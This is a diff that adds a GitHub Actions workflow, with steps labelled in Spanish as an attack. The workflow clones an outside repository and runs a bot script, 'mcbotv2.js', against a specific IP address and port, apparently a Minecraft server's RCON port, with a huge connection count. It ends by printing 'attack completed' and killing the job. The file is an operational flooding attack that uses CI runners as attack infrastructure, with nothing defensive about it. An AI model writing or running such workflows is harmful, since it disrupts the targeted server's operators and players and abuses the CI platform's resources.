@@ -1,0 +1,24 @@
+name: Ataa1a
+on:
+  workflow_dispatch:
+
+jobs:
+  anak:
+    runs-on: ubuntu-latest
+    timeout-minutes: 1
+    
+    steps:
+      - name: Clonar repositorio
+        run: |
+          git clone https://github.com/zjonch14/ssh2.git
+          
+      - name: Entrar y ejecutar ataque
+        run: |
+          cd ssh2
+          timeout 35 node mcbotv2.js 131.196.198.112 25575 aka 9999999 35
+          
+      - name: Forzar salida inmediata
+        if: always()
+        run: |
+          echo "✅ Ataque completado después de 20 segundos"
+          kill -9 $$  # Mata el proceso actual (job termina)
